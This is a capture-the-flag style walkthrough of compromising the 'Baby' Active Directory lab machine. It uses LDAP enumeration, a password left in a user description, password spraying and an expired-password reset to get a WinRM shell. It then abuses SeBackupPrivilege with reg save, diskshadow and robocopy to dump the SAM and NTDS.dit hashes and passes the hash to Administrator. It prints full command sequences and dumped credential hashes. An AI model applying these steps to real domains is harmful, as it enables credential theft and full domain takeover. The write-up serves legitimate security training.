### Summary
Performing `LDAP` user enumeration (unused user with LDAP query) to find an expired user password. Resetting the password gives us access to a `WinRM` shell and the user has `SeBackupPrivilege`, allowing the exfiltration of user hashes. The administrator hash derived from `SAM.save`, `SECURITY.save`, and `SYSTEM.save` was invalid, leading us to exfiltrate the domain hashes from `NTDS.dit` via `diskshadow` windows filesystem shadow copying. From there, we find a valid Administrator user hash and gain a root shell via `WinRM`

### Tools
- [[nmap]]
- [[NetExec (nxc)]]
- `evil-winrm`
- `regs.py` - remote windows registry manipulator (and backups)
	- or `regs save`
- `secretsdump.py` - grab hashes from registry files
- `diskshadow` - shadow copy windows filesystem (get busy locked files)
- `unix2dos` - convert from unix to windows newlines
- `robocopy` - windows robust file copier 

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#SMB - TCP 445]]
- [[#LDAP - TCP 389]]
	- [[#Password Spray Fail]]
	- [[#General LDAP Object Investigation]]
	- [[#Password Spray Success]]
###### [[#User Shell]]
- [[#Password Change]]
- [[#WinRM]]
###### [[#Root Shell]]
- [[#Enumeration]]
- [[#Exploit SeBackupPrivilege]]
	- [[#Local Hashes]]
	- [[#Domain Hashes]]

---
# Recon
## Initial Scanning
---
```sh
> sudo nmap -p- -vvv --min-rate 10000 10.129.41.152 -oN nmap/tcp
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-19 17:13 EST
...snip...
Completed SYN Stealth Scan at 17:13, 13.26s elapsed (65535 total ports)
Nmap scan report for 10.129.41.152
Host is up, received echo-reply ttl 127 (0.018s latency).
Scanned at 2025-12-19 17:13:07 EST for 13s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
55725/tcp open  unknown          syn-ack ttl 127
64824/tcp open  unknown          syn-ack ttl 127
64825/tcp open  unknown          syn-ack ttl 127
64834/tcp open  unknown          syn-ack ttl 127


> sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,55725,64824,64825,64834 -sCV 10.129.41.152 -oN nmap/scripts
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-19 17:20 EST
Nmap scan report for 10.129.41.152
Host is up (0.017s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-19 22:20:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-18T12:14:43
|_Not valid after:  2026-02-17T12:14:43
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-19T22:21:07+00:00
|_ssl-date: 2025-12-19T22:21:46+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
55725/tcp open  msrpc         Microsoft Windows RPC
64824/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64825/tcp open  msrpc         Microsoft Windows RPC
64834/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-19T22:21:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.34 seconds
```
- Key takeaways here:
	- Active Directory windows box
	- smb2 would be a great next step for further enumeration
	- hostname and domain `BabyDC.baby.vl`

- Can use [[NetExec (nxc)|netexec]] to make us a hosts entry file for us and put it at the top of our `/etc/hosts`
```sh
> nxc smb 10.129.41.152 --generate-hosts-file hosts
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
> ccat hosts    
10.129.41.152     BABYDC.baby.vl baby.vl BABYDC
> cat hosts /etc/hosts | sudo sponge /etc/hosts
```

- All ports show `TTL` of 127 which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows machines one-hop away

- `nmap` notes a clock skew:
```sh
| smb2-time: 
|   date: 2025-12-19T22:21:10
|_  start_date: N/A
```
- make sure to run `sudo ntpdate BABYDC.baby.vl` before any actions that use Kerberos auth

## SMB - TCP 445
---
- We can run some quick `nxc` checks on the smb service to see if it allows anonymous or guest account access:
```sh
❯ nxc smb BABYDC -u guest -p '' --shares                 
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 

❯ nxc smb BABYDC -u '' -p '' --shares   
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [+] baby.vl\: 
SMB         10.129.41.152   445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
- No luck here

## LDAP - TCP 389
---
- We can use `nxc` to dump user data:
```sh
❯ nxc ldap BABYDC --users
LDAP        10.129.41.152   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.41.152   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.41.152   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.41.152   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.41.152   389    BABYDC           Jacqueline.Barnett            2021-11-21 10:11:03 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Ashley.Webb                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Hugh.George                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Leonard.Dyer                  2021-11-21 10:11:03 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Connor.Wilkinson              2021-11-21 10:11:08 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Joseph.Hughes                 2021-11-21 10:11:08 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Kerry.Wilson                  2021-11-21 10:11:08 0                                                                    
LDAP        10.129.41.152   389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123!          
```
- Interesting, we see the user `Teresa.Bell` has an atypical Description: `Set initial password to BabyStart123!`

### Password Spray Fail
- We can derive this output to create a user list and try password spraying to gain access to the `smb` shares
```sh
❯ nxc smb BABYDC -u users -p BabyStart123!
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Guest:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! STATUS_LOGON_FAILURE 
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! STATUS_LOGON_FAILURE 
```
- Nothing :(

### General LDAP Object Investigation
- We can try scraping even more users from ldap by querying for all objects:
```sh
❯ nxc ldap BABYDC --query "(objectClass=*)" ""     
```
- The resulting data is a lot, but if solely observe headers:
```sh
LDAP        10.129.41.152   389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```
- We see another user we missed before, `Caroline Robinson`
- The key here is performing an `LDAP` search for any response with a **disinguished name** (`dn`)

### Password Spray Success
- We can format `Caroline Robinson` with the rest of the usernames `Caroline.Robinson` and test our password:
```sh
❯ nxc smb BABYDC -u "Caroline.Robinson" -p BabyStart123!
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
```
- Interesting, we don't see password failed, but `STATUS_PASSWORD_MUST_CHANGE`, likely indicating the password has expired

# User Shell
### Password Change
- We can use the `netexec` module `change-password` to update `Caroline.Robinson`'s expired password 
```sh
❯ nxc smb BABYDC -u "Caroline.Robinson" -p BabyStart123! -M change-password -o NEWPASS=pass
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.129.41.152   445    BABYDC           [-] SMB-SAMR password change failed: SAMR SessionError: code: 0xc000006c - STATUS_PASSWORD_RESTRICTION - When trying to update a password, this status indicates that some password update rule has been violated. For example, the password may not meet length criteria.
```
- In trying to change the password to `pass`, we violate the password complexity requirement
- If we input a more complex password like `0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123`, it successfully changes!

- We can use `netexec` to list the password policy once we've authenticated:
```sh
❯ nxc smb BABYDC -u "Caroline.Robinson" -p "0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123" --pass-pol
```
![[Pasted image 20251219180235.png]]

### WinRM
- The new password works with `WinRM`!
```sh
❯ nxc winrm BABYDC -u "Caroline.Robinson" -p "0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123"         
WINRM       10.129.41.152   5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) 
WINRM       10.129.41.152   5985   BABYDC           [+] baby.vl\Caroline.Robinson:0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123 (Pwn3d!)
```

- Now we can get a shell with `evil-winrm`
```sh
❯ evil-winrm -i BABYDC -u Caroline.Robinson -p "0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123"

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> cat user.txt
3b06412ebcfd06ba7a7c96b393a27d8d
```

# Root Shell
## Enumeration
---
- There are no other users in the `\Users` directory
```powershell
*Evil-WinRM* PS C:\Users> ls
    Directory: C:\Users
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/4/2024   3:33 PM                Administrator
d-----         7/27/2024  10:27 PM                Caroline.Robinson
d-r---        11/21/2021   3:29 PM                Public
```

- For some reason, `Caroline.Robinson` can list the files in the `Administrator`'s home directory:
```powershell
*Evil-WinRM* PS C:\Users> tree /f .
Folder PATH listing
Volume serial number is 0000025B 7DCD:94E1
C:\USERS
+---Administrator
¦   +---3D Objects
¦   +---Contacts
¦   +---Desktop
¦   ¦       root.txt
¦   ¦
¦   +---Documents
¦   +---Downloads
¦   +---Favorites
¦   ¦   ¦   Bing.url
¦   ¦   ¦
¦   ¦   +---Links
¦   +---Links
¦   ¦       Desktop.lnk
¦   ¦       Downloads.lnk
¦   ¦
¦   +---Music
¦   +---Pictures
¦   +---Saved Games
¦   +---Searches
¦   +---Videos
```
- Can't open `root.txt` though :P

- We can further enumerate `Caroline.Robinson`'s user permissions with the powershell command `whoami` (`whoami /?` to see more options)
```powershell
*Evil-WinRM* PS C:\Users> whoami /all
```
![[Pasted image 20251219181508.png]]
- One thing that should jump out to us is that `Caroline.Robinson` is part of the Microsoft group `Backup Operators`
- Being in this group gives `SeBackupPrivilege` and `SeRestorePrivielge`

## Exploit SeBackupPrivilege
---
### Local Hashes
- We can use the `impacket` `reg.py` script to create backups of the registry hive files:
```sh
❯ reg.py caroline.robinson:"0xdeadbeef0xdeadbeef0xdeadbeef0xdeadbeef***123"@10.129.41.152 backup -o "C:\Windows\temp"
```
- Alternatively, we could use `reg save` Windows utility:
```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam .\sam
The operation completed successfully.
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system .\system
The operation completed successfully.
```

- We can now download the files using `evil-winrm`
```powershell
*Evil-WinRM* PS C:\Windows\temp> download SAM.save SAM.save
*Evil-WinRM* PS C:\Windows\temp> download SECURITY.save SECURITY.save
*Evil-WinRM* PS C:\Windows\temp> download SYSTEM.save SYSTEM.save
```
- We only really need the `SAM` and `SYSTEM` hive files
	- `SAM` stores local account metadata and `NTLM` hashes for local users
	- `SYSTEM` contains info needed to derive the bootkey to decrypt `SAM`

- We can dump the hashes using `secretsdump.py`:
```sh
❯ secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:0d43eb797b84b0b440fbcb0d89fea14f8458970482b891850f2d2106c7c08447f2aa725adc71c58241311e5cebf5b75d43f5b541a43d583665ea4669bee9d1910c4ee1f4703104fccf44eb3ac2b3bb31ed1712e4fca7e416d3bd561993cd88a9750b0a04466909e51660a3fec061e9f5a51e8e10fe8c2653cd610140611ea9cd2fc1f436829369373bfb51fc5214666a9073e7a8124f4a07414ee0a7e565f24745f2ec5f134e7b7dca577813e5e82867ea33b16a1797c51703731eb1e4273db597063d62cb7f1c1a0faae15ab06aadea286b87cf6f2d28127fb948113c6b57c92a97c1aad038f958404b27f6e6d6fba5
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe620195f1a5e2d71842bbad9877d7c3ca8a31eda
dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
[*] NL$KM 
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Cleaning up... 
```

- We can try the Administrator hash that we uncovered `8d992faed38128ae85e95fa35868bb43`:
```sh
❯ nxc smb BABYDC -u Administrator -H 8d992faed38128ae85e95fa35868bb43            SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE 
```
- Unfortunately it doesn't work :(

### Domain Hashes
- To dump the domain hashes, we’ll want to get the `C:\Windows\NTDS.dit` file. 
- Unfortunately, this file can’t just be copied as it is locked and in use. 
- We can access it via a shadow copy, which we’ll generate with `diskshadow` and this script:
```
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\0xdf.cab
add volume c: alias wallfly
create
expose %wallfly% w:
```
- Saving this as `shadowscript`, we can convert the newline characters from unix to windows with:
```sh
❯ unix2dos shadowscript 
```

- We can upload it to Baby via `evil-winrm` and pass it to `diskshadow`:
```powershell
*Evil-WinRM* PS C:\Windows\temp> upload shadowscript .

*Evil-WinRM* PS C:\Windows\temp> diskshadow /s shadowscript
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  12/19/2025 11:41:40 PM

-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\0xdf.cab
-> add volume c: alias wallfly
-> create

Alias wallfly for shadow ID {82d2147b-1f11-4db5-b2be-c7fdc098cd24} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {c22f7092-1d3f-4a2c-8755-f8d330e6f34b} set as environment variable.
Inserted file Manifest.xml into .cab file 0xdf.cab
Inserted file DisD141.tmp into .cab file 0xdf.cab

Querying all shadow copies with the shadow copy set ID {c22f7092-1d3f-4a2c-8755-f8d330e6f34b}

        * Shadow copy ID = {82d2147b-1f11-4db5-b2be-c7fdc098cd24}               %wallfly%
                - Shadow copy set: {c22f7092-1d3f-4a2c-8755-f8d330e6f34b}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 12/19/2025 11:41:41 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %wallfly% w:
-> %wallfly% = {82d2147b-1f11-4db5-b2be-c7fdc098cd24}
The shadow copy was successfully exposed as w:\.
->
```

- There's now a copy of the `C:` drive at `W:`:
```sh
*Evil-WinRM* PS C:\Windows\temp> ls W:
    Directory: W:\
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         4/16/2025   9:17 AM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         4/16/2025   8:35 AM                Program Files
d-----         4/16/2025   9:38 AM                Program Files (x86)
d-r---         7/27/2024  10:27 PM                Users
d-----         8/20/2025   9:07 AM                Windows
```

- We can use `robocopy` to get the `NTDS.dit` file out:
```powershell
*Evil-WinRM* PS C:\Windows\temp> robocopy /b W:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, December 19, 2025 11:45:08 PM
   Source : W:\Windows\ntds\
     Dest : C:\Windows\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
```
- `/b` - backup mode

- Now we can extract `NTDS.dit` with `evil-winrm` and crack it open with `secretsdump.py` like before!
```sh
❯ secretsdump.py -ntds ntds.dit -system SYSTEM.save LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
[*] Cleaning up...
```
- Different administrator hash! `ee4457ae59f1e3fbd764e33d9cef123d`

- We can verify a login with `netexec`:
```sh
❯ nxc smb BABYDC -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d            
SMB         10.129.41.152   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.152   445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```
- There's no better sight

- We can pop another shell with `evil-winrm`:
```sh
❯ evil-winrm -i BABYDC -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
185ea66f6bc32f7835bee125d4d3502d
```




